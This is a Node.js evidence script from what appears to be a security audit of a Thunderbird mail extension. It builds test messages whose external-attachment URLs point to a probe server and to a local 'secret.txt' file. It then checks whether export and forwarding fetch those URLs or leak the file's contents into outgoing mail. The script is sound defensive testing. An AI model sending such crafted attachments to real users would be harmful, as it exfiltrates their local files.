"use strict";

// Spike / evidence script for finding A (external attachment URLs).
// Usage: THUNDERBIRD_BIN=... node test/native/spike-external-attachments.cjs
// Prints what the extension does with X-Mozilla-External-Attachment-URL
// parts for export, inline images, direct forward and review forward.

const fs = require("node:fs");
const path = require("node:path");
const h = require("./harness.cjs");
const f = require("./fixtures.cjs");

const INBOX = "mailbox://alice@127.0.0.1/Inbox";

function contains(data, text) {
  return data.includes(text) || data.includes(Buffer.from(text).toString("base64").slice(0, 16));
}

(async () => {
  let secretFile;
  const tb = await h.startThunderbird({
    mailboxes: ({ probe, root }) => {
      secretFile = path.join(root, "secret.txt");
      fs.writeFileSync(secretFile, "LOCAL-SECRET-CONTENT");
      const fileUrl = `file:///${secretFile.replace(/\\/g, "/")}`;
      return {
        alice: {
          Inbox:
            f.externalAttachment({ id: "ext-http@attacker.test", url: probe.url("/ext-http") }) +
            f.externalAttachment({ id: "ext-file@attacker.test", url: fileUrl, filename: "secret.txt", contentType: "text/plain" }) +
            f.externalInlineImage({ id: "ext-inline@attacker.test", url: probe.url("/ext-inline") }) +
            f.externalAttachment({ id: "ext-review@attacker.test", url: probe.url("/ext-review") }),
        },
      };
    },
  });
  const report = {};
  try {
    await tb.waitForMessages(INBOX, 4);
    for (const id of ["ext-http@attacker.test", "ext-file@attacker.test"]) {
      const r = await tb.call("getMessage", { messageId: id, folderPath: INBOX, saveAttachments: true });
      report[id] = (r.result.attachments || []).map((a) => ({
        ...a,
        exportedContent: a.filePath && fs.existsSync(a.filePath) ? fs.readFileSync(a.filePath, "utf8").slice(0, 60) : undefined,
      }));
    }
    const inline = await tb.call("getMessage", { messageId: "ext-inline@attacker.test", folderPath: INBOX, includeInlineImages: true });
    report.inline = { attachments: inline.result.attachments, inlineImageContent: inline.result.inlineImageContent };
    report.probeAfterRead = tb.probe.requests.map((r) => r.url);

    const fw1 = await tb.call("forwardMessage", { messageId: "ext-http@attacker.test", folderPath: INBOX, to: "dest@sink.test", skipReview: true });
    const fw2 = await tb.call("forwardMessage", { messageId: "ext-file@attacker.test", folderPath: INBOX, to: "dest@sink.test", skipReview: true });
    report.directForward = [fw1.result || fw1.rpcError, fw2.result || fw2.rpcError];
    await h.sleep(2000);
    report.smtp = tb.smtp.messages.map((m) => ({
      remote: contains(m.data, "PROBE-REMOTE-CONTENT"),
      secret: contains(m.data, "LOCAL-SECRET-CONTENT"),
      tail: m.data.slice(-400),
    }));

    // Native review forward: open the compose window, inspect its attachment list.
    const before = tb.probe.requests.length;
    const rv = await tb.call("forwardMessage", { messageId: "ext-review@attacker.test", folderPath: INBOX, to: "dest@sink.test" });
    report.reviewForward = rv.result || rv.rpcError;
    await h.sleep(4000);
    report.reviewComposeAttachments = await tb.marionette.run(`
      const out = [];
      for (const win of Services.wm.getEnumerator("msgcompose")) {
        const bucket = win.document.getElementById("attachmentBucket");
        for (const item of bucket?.itemChildren || []) {
          out.push({ url: item.attachment.url, name: item.attachment.name, size: item.attachment.size });
        }
      }
      return out;
    `);
    report.probeDuringReview = tb.probe.requests.slice(before).map((r) => r.url);
  } finally {
    await tb.stop();
  }
  console.log(JSON.stringify(report, null, 2));
})().catch((e) => { console.error("FAIL", e); process.exit(1); });
